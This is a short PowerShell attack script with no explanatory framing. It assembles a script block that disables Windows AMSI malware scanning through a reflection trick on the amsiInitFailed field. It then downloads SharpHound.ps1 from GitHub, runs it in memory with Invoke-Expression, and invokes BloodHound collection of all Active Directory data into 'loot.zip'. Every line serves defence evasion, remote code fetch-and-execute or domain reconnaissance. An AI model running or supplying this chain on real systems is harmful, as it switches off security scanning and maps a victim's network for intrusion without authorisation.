$pre = '[ScriptBlock]::Create('
$amsiBypass = '"[Ref].Assembly.GetType(""System.Management.Automation.AmsiUtils"").GetField(""amsiInitFailed"",''NonPublic,Static'').SetValue($null,$true);"'
$download = '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/master/Collectors/SharpHound.ps1'');"'
$run = '"Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"'
$post = ')'

$payload = $pre + $amsiBypass + $download + $run + $post

$sb = Invoke-Expression $payload
& $sb
